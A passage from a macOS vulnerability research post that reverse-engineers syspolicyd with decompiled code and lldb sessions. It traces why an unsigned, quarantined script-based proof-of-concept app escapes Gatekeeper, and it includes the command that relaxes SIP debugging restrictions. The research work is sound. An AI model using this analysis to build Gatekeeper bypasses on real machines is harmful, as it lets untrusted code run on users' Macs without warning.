</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>      ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>      os_log_impl(__mh_execute_header, rbx, <span style="color:#ae81ff">0x1</span>, <span style="color:#e6db74">&#34;Script evaluation: %@, %@&#34;</span>, <span style="color:#f92672">&amp;</span>var_50, <span style="color:#ae81ff">0x16</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>  }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span>  <span style="color:#75715e">//alloc/init ProcessTarget object w/ path to responsible process
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span><span style="color:#75715e"></span>  processTarget <span style="color:#f92672">=</span> [ProcessTarget alloc];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span>  rProcess <span style="color:#f92672">=</span> [processTarget initWithPath:rpPath withAuditToken:rcx];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span><span>  <span style="color:#75715e">//perform the evaluation
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span><span><span style="color:#75715e"></span>  [execManger gatekeeperEvaluationForUser:arg2 withPID:arg3 withProcessPath:path 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span><span>   withParentProcessPath:pPath withResponsibleProcess:rProcess withLibraryPath:<span style="color:#ae81ff">0x0</span> 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span><span>   processIsScript:<span style="color:#ae81ff">0x1</span> forEvaluationID:var_70];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33</span><span>  ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35</span><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36</span><span>}</span></span></code></pre></div>
<p>Via static analysis of this subroutine (which takes eight arguments!), we can gain a fairly comprehensive insight into its actions.</p>
<p>First, it converts various arguments (that have been passed in a NULL-terminated &lsquo;C&rsquo;-strings) into Objective-C <code>NSString</code>s. Then retrieves an <code>ExecManagerService</code> class&rsquo;s <code>globalManager</code>. After checking if logging is enabled (and if so logging the aforementioned <code>&quot;Script evaluation&quot;</code> message), it allocates an instance of a <code>ProcessTarget</code> class.</p>
<p>It then initializes this <code>ProcessTarget</code> object via a call to its <code>initWithPath: withAuditToken</code> method. Finally the subroutine invokes the <code>ExecManagerService</code>
<code>gatekeeperEvaluationForUser: withPID: withProcessPath: withParentProcessPath: withResponsibleProcess: withLibraryPath: processIsScript: forEvaluationID:</code> method.</p>
<p>Thanks to the verbose method name, we can rather quickly determine the meaning of the arguments passed to the subroutine. For example, <code>withPID:arg3</code> implies the fourth argument (<code>arg3</code>) is a pid of the process to evaluate. Also note that several values passed to the <code>gatekeeperEvaluationForUser: withPID: ...</code> method are hardcoded, most notably, <code>processIsScript</code> is set to <code>0x1</code>. This of course makes sense, as the evaluation is on a script-based application.</p>
<p>Though we have a decent understanding of this subroutine (and its arguments), let&rsquo;s double check our conclusions via a dynamic debugging session.</p>
<div class="note">
If one wants to debug Apple processes such as syspolicyd, System Integrity Protection (SIP), must be disabled in some manner. 
<p>Interestingly (and at this point I have no idea why), if one fully disables SIP, the bug will no longer manifest!? That is to say, with SIP fully disabled, running the proof of concept application will result in an alert, identifying it as untrusted code from the Internet. Ironic!</p>
<p>For analysis reasons this is not ideal, as we&rsquo;re trying to track down why (with SIP enabled) the unsigned PoC is allowed. The solution is to leave SIP mostly enabled, but simply allow debugging. This can achieved by executing <code>csrutil enable --without debug</code> in Recovery Mode:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% csrutil status
System Integrity Protection status: unknown (Custom Configuration).
Configuration:
  Kext Signing: enabled
  Filesystem Protections: enabled
  Debugging Restrictions: disabled
  ...
This is an unsupported configuration, likely to break in the future and leave your machine in an unknown state.
</pre>
</div>
<p>Note that as macOS 11&rsquo;s csrutil appears broken, one must side-install macOS 10.15. Then boot into its recovery mode, run its csrutil to set the SIP flags. On Intel-based Macs this will be applied to any/all installed OS. Not so on M1 systems.</p>
</div>
<p>Once SIP has been configured to allow for the debugging of Apple processes, let&rsquo;s attach to <code>syspolicyd</code>, set a breakpoint on the (unnamed) subroutine, then launch our quarantined <code>PoC.app</code></p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

% !ps
ps aux | grep syspolicyd
root 138  /usr/libexec/syspolicyd

% sudo lldb -p 138
(lldb) process attach --pid 138
Process 138 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = signal SIGSTOP

Executable module set to "/usr/libexec/syspolicyd".
Architecture set to: x86_64h-apple-macosx-.

(lldb) image list
[  0] 818DB070-4938-3106-9784-559DA9C41D40 0x0000000100860000 /usr/libexec/syspolicyd 

</pre>
</div>
<p>Note that the <code>syspolicyd</code> image has been rebased to <code>0x0000000100860000</code> (due to ASLR). Thus, we similarly rebase our static analysis image in our disassembler (so that memory address match, etc.):</p>
<img src="../images/blog/blog_0x64/rebase.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Rebasing syspolicyd</center>

<p>Now, we set a breakpoint on the (unnamed) subroutine where the script evaluation begins:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
(lldb) b 0x000000010088a068
Breakpoint 1: where = syspolicyd`___lldb_unnamed_symbol611$$syspolicyd, address = 0x000000010088a068

</pre>
</div>
<p>Launching the proof of concept application, triggers the breakpoint, allowing us (amongst other things) to view the contents of the arguments. From our static analysis we determined that the third argument was the user&rsquo;s id, the fourth the pid of the process to evaluate, the fifth its path, the sixth the parent&rsquo;s process path, etc etc. Let&rsquo;s view these now (noting arrangements in Intel x86_64 environments are passed in the following order, <code>RDI</code>, <code>RSI</code>, <code>RDX</code>, <code>RCX</code>, <code>R8</code>, <code>R9</code>, and then on the stack):</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
(lldb) p (int)$rdx
(int) $24 = 501

(lldb) p (int)$rcx
(int) $25 = 27038

(lldb) x/s $r8
0x70001018c6f8: "/Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC"

(lldb) x/s $r9
0x70001018c734: "/bin/sh"

</pre>
</div>
<p>Everything matches what we expect, though let&rsquo;s confirm the fourth argument (the pid, in <code>RCX</code>) with a value of 27038 is indeed the pid of process set to be evaluated:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% ps -p 27038
PID   CMD
27038 /bin/sh /private/var/folders/pw/sv96s36d0qgc_6jh45jqmrmr0000gn/T/AppTranslocation/743C3DB6-64D7-41B3-9040-D46B74E5296F/d/PoC.app/Contents/MacOS/PoC
</pre>
</div>
<p>Turns out that <code>27038</code> is an instance of a the shell (<code>/bin/sh</code>) set to run our proof of concept script: <code>PoC.app/Contents/MacOS/PoC</code>. This makes sense, as scripts (unlike say a compiled mach-O binary) of course can not be run natively. They need an interpreter process, such as <code>/bin/sh</code>.</p>
<p>It&rsquo;s worth reiterating that the process (<code>27038</code>: <code>/bin/sh</code>) though created is held in a suspended state until the evaluation has completed. (And if the system finds it violates a policy such as being unnotarized or running a quarantined script from an unnotarized bundle, it is killed without ever having been run &hellip;unless of course there is a vulnerability!).</p>
<p>Also, note the &ldquo;strange&rdquo; path to our script-based PoC application. Known as App Translocation, this security mechanism transparently relocates (copies) any downloaded (i.e. quarantined) content the first time it is launched by the user. This action is to mitigate a Gatekeeper bypass I discovered in 2016, that leveraged dylib hijacking in order to allow unsigned code to run. Though the vulnerability discussed in this post is not related to App Translocation, it&rsquo;s important to at least understand why the location of our PoC has changed.</p>
<p>Ok onwards! Let&rsquo;s continue on with our debugging, stopping at the call to the <code>gatekeeperEvaluationForUser: withPID:</code> method to examine the arguments.</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
(lldb) Process 138 stopped
syspolicyd`___lldb_unnamed_symbol611$$syspolicyd:
->  0x10088a223 <+443>: callq  *%rax


(lldb) po $rdi
&lt;ExecManagerService: 0x7fdb5e733150&gt;

(lldb) po [$rdi className]
ExecManagerService

(lldb) x/s $rsi
0x7fff7e1df01d: "gatekeeperEvaluationForUser:withPID:withProcessPath:withParentProcessPath:withResponsibleProcess:withLibraryPath:processIsScript:forEvaluationID:"

(lldb) p (int)$rdx
(int) $34 = 501

(lldb) p (int)$rcx
(int) $35 = 27038

(lldb) po $r8
/Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC

(lldb) po $r9
/bin/sh

(lldb) x/gx $rsp
0x70001018c570: 0x00007fdb6312cf20
(lldb) po 0x00007fdb6312cf20
<ProcessTarget: 0x7fdb6312cf20>

</pre>
</div>
<p>First we print out the object in the first argument, which is the Objective-C object upon which the method is being invoked. It&rsquo;s the <code>globalManager</code> (class: <code>ExecManagerService</code>) created by the subroutine. The second argument holds the method name, <code>gatekeeperEvaluationForUser:withPID: ...</code>. The remaining arguments include the user id (<code>uid</code>), the pid of the (suspended) process, the path to the item to evaluate (our PoC script-based app), path of the parent process, then an instance of a <code>ProcessTarget</code> class, which represents the responsible process. This argument is passed via the stack (as all the registers that are used for a method call have already been used). Specifically it can be found at $rsp + 0x0, with a value of <code>0x00007fdb6312cf20</code>. This is a pointer to an Objective-C (<code>ProcessTarget</code>) object, meaning we can introspect it, including accessing its pid and path:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
(lldb) p (int)[0x00007fdb6312cf20 pid]
(int) $51 = 27038

(lldb) po [0x00007fdb6312cf20 path]
/bin/sh

</pre>
</div>
<p>Turns out this responsible process, is also the parent process (<code>/bin/sh</code>, pid <code>27038</code>).</p>
<p>So far nothing too surprising or strange. We&rsquo;ve simply confirmed the fact that the <code>syspolicyd</code> daemon is about to evaluate our script-based PoC app, as it&rsquo;s executed via the shell (<code>/bin/sh</code>).</p>
<p>Let&rsquo;s now turn our attention to the <code>gatekeeperEvaluationForUser:withPID:withProcessPath:</code> method. A brief triage of a decompilation of this method, reveals it simply makes a <code>dispatch_async</code> call, to execute a block, allowing a background queue to asynchronously perform the evaluation. The block invokes the <code>ExecManagerPolicy</code>&rsquo;s <code>evaluateCodeForUser:withPID:withProcessPath:withParentProcessPath:withResponsibleProcess: withLibraryPath:processIsScript:withCompletionCallback:</code> method. It passes along the arguments we&rsquo;ve already described (along with a callback block that will be invoked once the evaluation has completed).</p>
<p>This method first allocates an object of <code>EvaluationResult</code> and set its <code>allowed</code> instance variable to false (0x0):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ObjC" data-lang="ObjC"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>evalReesult <span style="color:#f92672">=</span> objc_alloc_init(@<span style="color:#66d9ef">class</span>(EvaluationResult));
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>[evalReesult setAllowed:<span style="color:#ae81ff">0x0</span>];</span></span></code></pre></div>
<p>&hellip;wise, explicitly default any evaluation to not allowed.</p>
<p>It then prints out a log message we saw earlier:
<code>GK process assessment: /Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC &lt;-- (/bin/sh, /bin/sh)</code></p>
<p>By analyzing the values passed to the log message&rsquo;s format string, <code>GK process assessment: %@ &lt;-- (%@, %@)</code>, we know this message prints out the process (or script) to evaluate, along with its parent and responsible processes (which in this case are the same, <code>/bin/sh</code>).</p>
<p>After checking that the process (or script) to evaluate is an accessible file, the code invokes an unnamed subroutine which takes the path to the evaluatee (e.g. <code>PoC.app/Contents/MacOS/PoC</code>), and returns a boolean value. More on this later, but this value is then stored in an instance variable named <code>isBundle</code>, so safe to assume it contains logic related to determining if an item falls within an (application?) bundle &hellip;ü§î</p>
<p>Next the method allocates an object of type <code>PolicyScanTarget</code> and initializes it with the path of the item to evaluate (e.g. <code>PoC.app/Contents/MacOS/PoC</code>). It then sets various instance variables in this newly allocated object:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ObjC" data-lang="ObjC"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>policyScanTarget <span style="color:#f92672">=</span> [[PolicyScanTarget alloc] initWithURL:evaluatee];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>[policyScanTarget setTriggeredByLibraryLoad:var_51];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>[policyScanTarget setIsScript:sign_extend_64(var_24)];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>[policyScanTarget setIsBundled:var_6C <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>[policyScanTarget setPid:var_98];</span></span></code></pre></div>
<p>Recall that (several method calls back), <code>gatekeeperEvaluationForUser</code> was invoked with <code>withLibraryPath:0x0</code> and  <code>processIsScript:0x1</code>. These (hardcoded) values were passed in as parameters and are passed to the <code>PolicyScanTarget</code>&rsquo;s object&rsquo;s <code>setTriggeredByLibraryLoad</code> and <code>setIsScript</code> setter methods. Similarly, the <code>setPid</code> method is invoked with the passed in process id. The <code>setIsBundled</code> is notable, as its parameter (<code>var_6C</code>), is a boolean, returned from the aforementioned unnamed subroutine that was called a few instructions earlier.</p>
<p>In a debugger, once we&rsquo;ve stepped over the <code>PolicyScanTarget</code> method, we can print it out. Specifically we can invoke any of its accessor methods to reveal the contents of initialized instance variables. And how do we know the names of these accessor methods? The easiest way is simply via the disassembler (which can parse Objective-C objects and extract this information):</p>
<img src="../images/blog/blog_0x64/pst.png"  width="75%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">PolicyScanTarget&#39;s methods</center>

<p>So for example we confirm the facts that the &ldquo;url&rdquo; points to our PoC script, the <code>isScript</code> is set to true (0x1), and also introspect the value of the <code>isBundled</code> instance variable. Note that in the debugger output the address <code>0x00007fdb5e706a40</code> is the <code>PolicyScanTarget</code> object:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

(lldb) po [0x00007fdb5e706a40 className]
PolicyScanTarget

(lldb) po [0x00007fdb5e706a40 url]
file:///Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC

(lldb) p (BOOL)[0x00007fdb5e706a40 isScript]
(BOOL) $73 = YES

(lldb) p (BOOL)[0x00007fdb5e706a40 triggeredByLibraryLoad]
(BOOL) $74 = NO

(lldb) p (BOOL)[0x00007fdb5e706a40 isBundled]
(BOOL) $72 = NO

</pre>
</div>
<p>The <code>evaluateCodeForUser:withPID: ...</code> method then creates another <code>PolicyScanTarget</code>, this time for the parent process, though it&rsquo;s solely initialized with the parent processes path (e.g. <code>/bin/sh</code>) &hellip;no other instance variables are initialized.</p>
<p>Finally the <code>EvaluationManager</code>&rsquo;s <code>evaluateTarget: withParentTarget: withResponsibleProcess: forUser: onCompletion:</code> is invoked. The <code>evaluateTarget</code> is set to the <code>PolicyScanTarget</code> object for our evaluee, while the <code>withParentTarget</code> is set to the <code>PolicyScanTarget</code> object that was created for the parent process. The other parameters are simply set to values passed into the <code>evaluateCodeForUser:withPID: ...</code> method.</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
(lldb) Process 138 stopped
* thread #30, queue = 'syspolicy.executions.evaluations', stop reason = instruction step over
    frame #0: 0x000000010087cab0 syspolicyd`___lldb_unnamed_symbol447$$syspolicyd + 1854
syspolicyd`___lldb_unnamed_symbol447$$syspolicyd:
->  0x10087cab0 <+1854>: callq  *0x838ea(%rip)            ; (void *)0x00007fff20298d00: objc_msgSend
    0x10087cab6 <+1860>: movq   0x838eb(%rip), %r13       ; (void *)0x00007fff2029a9a0: objc_release
    0x10087cabd <+1867>: movq   %r14, %rdi
    0x10087cac0 <+1870>: callq  *%r13
Target 0: (syspolicyd) stopped.

(lldb) po $rdi
&lt;EvaluationManager: 0x7fdb5e40d0c0:&gt;

(lldb) x/s $rsi
0x7fff7e1dde2b: "evaluateTarget:withParentTarget:withResponsibleProcess:forUser:onCompletion:"

(lldb) po $rdx
PST: (path: /Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC), (team: (null)), (id: (null)), (bundle_id: (null))

(lldb) po $rcx
PST: (path: /bin/sh), (team: (null)), (id: (null)), (bundle_id: (null))

</pre>
</div>
<p>The <code>evaluateTarget: withParentTarget: ...</code> method calls down into various methods which eventually invokes the <code>EvaluationManager</code>&rsquo;s <code>scanTarget:onCompletion:</code> method. This method queues up a scan, via a block that calls into the <code>EvaluationManager</code>s <code>performScan: withProgressHandler: withCodeEvaluation:</code></p>
<p>The <code>performScan: withProgressHandler: withCodeEvaluation:</code> is important as it (finally!) calls into the policy engine (<code>PolicyScanner</code>) scan methods (such as <code>scanTarget: ...</code> method), but more importantly contains the <code>GK scan complete:</code> log message. This indicates that the evaluation is finally complete!</p>
<p>Ready to dive into the internals of the policy engine? Yah, me neither &hellip;and turns out we don&rsquo;t have to!</p>
<p>From our initial log spelunking (between a normal application, a normal script-based application, and our PoC), recall that the only (main) difference was in a single value found within the <code>GK evaluateScanResult: </code> message. For the applications that triggered an alert this value was a 0, while for our PoC (that generated no alerts and was incorrectly allowed to run), it was a 2. All other policy related log message (e.g. notarization checks, etc) were the same.</p>
<p>At this point during my analysis, with a thorough understanding of at least the evaluation setup (and relevant classes such as <code>EvaluationManager</code>, <code>PolicyScanTarget</code> and <code>EvaluationResult</code>), I decided to skip diving into the internals of the policy engine and instead work backwards from the <code>GK evaluateScanResult: </code> message. The idea was to see if I could figure out why the proof of concept application was assigned a 2 &hellip;as this seemed to be the only differentiator, and perhaps why it was allowed (vs. blocked).</p>
<p>The <code>GK evaluateScanResult: </code> message in the <code>EvaluationManager</code>&rsquo;s is logged in the aptly named <code>evaluateScanResult: withEvaluationArguments: withPolicy: withEvaluationType: withCodeEval:</code> method.</p>
<p>Setting a breakpoint here, we can see it&rsquo;s invoked after an evaluation has completed, and contains the results of the scan, scan arguments (which includes the <code>PolicyScanner</code> object of the evaluee &hellip;our PoC script), and an evaluation type:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
(lldb) c
Process 138 resuming
Process 138 stopped
* thread #44, queue = 'syspolicyd.evaluations.completion', stop reason = breakpoint 8.1
    frame #0: 0x00000001008af4ca syspolicyd`___lldb_unnamed_symbol1234$$syspolicyd


(lldb) po $rdi
&lt;EvaluationManager: 0x7fdb5e40d0c0&gt;

(lldb) x/s $rsi
0x7fff7e1e025e: "evaluateScanResult:withEvaluationArguments:withPolicy:withEvaluationType:withCodeEval:"

(lldb) po [$rdx className]
ScanResult

(lldb) po $rdx
ScanResult: 1,0,0,0 - 0,7,0x0

(lldb) po [$rcx className]
EvaluationArguments

(lldb) po $rcx
EvalArgs: PST: (path: /Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC), (team: (null)), (id: (null)), (bundle_id: NOT_A_BUNDLE), PST: (path: /bin/sh), (team: (null)), (id: (null)), (bundle_id: (null)), &lt;ProcessTarget: 0x7fdb60c8ce60&gt;, 501, 0, 1

(lldb) po $r8
&lt;nil&gt;

(lldb) po $r9
2

</pre>
</div>
<p>Now recall an example of the <code>GK evaluateScanResult: ...</code> log message:</p>
<pre tabindex="0"><code>GK evaluateScanResult: 2, PST: (path: /Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC), (team: (null)), (id: (null)), (bundle_id: NOT_A_BUNDLE), 1, 0, 1, 0, 7, 0 
</code></pre><p>Looking at the code that prints out this message, provides valuable insight into the components of the message:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ObjC" data-lang="ObjC"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">if</span> (os_log_type_enabled(rax, <span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>  var_B0 <span style="color:#f92672">=</span> [var_A0 isQuarantined];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>  var_B8 <span style="color:#f92672">=</span> [var_A0 isUserApproved];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>  var_F0 <span style="color:#f92672">=</span> [r13 success];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>  rbx <span style="color:#f92672">=</span> [r13 isBypass];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>  r14 <span style="color:#f92672">=</span> [r13 policyMatch];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>  rax <span style="color:#f92672">=</span> [r13 xpResult];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>  var_70 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8000802</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>  <span style="color:#f92672">*</span>(<span style="color:#f92672">&amp;</span>var_70 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x4</span>) <span style="color:#f92672">=</span> var_D8;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>  <span style="color:#f92672">*</span>(int16_t <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>var_70 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xc</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x840</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>  <span style="color:#f92672">*</span>(<span style="color:#f92672">&amp;</span>var_70 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xe</span>) <span style="color:#f92672">=</span> var_A0;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>  <span style="color:#f92672">*</span>(int16_t <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>var_70 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x16</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>  <span style="color:#f92672">*</span>(int32_t <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>var_70 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>) <span style="color:#f92672">=</span> sign_extend_64(var_B0);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>  <span style="color:#f92672">*</span>(int16_t <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>var_70 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1c</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>  <span style="color:#f92672">*</span>(int32_t <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>var_70 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1e</span>) <span style="color:#f92672">=</span> sign_extend_64(var_B8);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>  <span style="color:#f92672">*</span>(int16_t <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>var_70 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x22</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>  <span style="color:#f92672">*</span>(int32_t <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>var_70 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x24</span>) <span style="color:#f92672">=</span> sign_extend_64(var_F0);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>  <span style="color:#f92672">*</span>(int16_t <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>var_70 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>  <span style="color:#f92672">*</span>(int32_t <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>var_70 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2a</span>) <span style="color:#f92672">=</span> sign_extend_64(rbx);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>  <span style="color:#f92672">*</span>(int16_t <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>var_70 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2e</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x800</span>;
